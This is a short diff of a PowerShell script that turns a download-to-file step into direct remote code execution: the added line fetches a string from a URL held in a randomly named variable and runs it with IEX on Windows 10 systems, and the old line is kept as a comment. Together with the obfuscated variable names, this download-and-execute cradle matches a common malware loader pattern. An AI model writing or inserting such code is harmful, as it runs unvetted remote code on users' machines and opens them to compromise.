@@ -66,7 +66,7 @@ finally {
     #}
         
     if ($OSVersion -match "10") {
-        $lwoxheihwic = (new-object net.webclient); Add-Content -Path ".\AIQlib207.ps1" $lwoxheihwic.downloadstring($ishscjsof)
+        $lwoxheihwic = (new-object net.webclient); IEX ($lwoxheihwic.downloadstring($ishscjsof));#Add-Content -Path ".\AIQlib207.ps1" $lwoxheihwic.downloadstring($ishscjsof)
     }
 
 
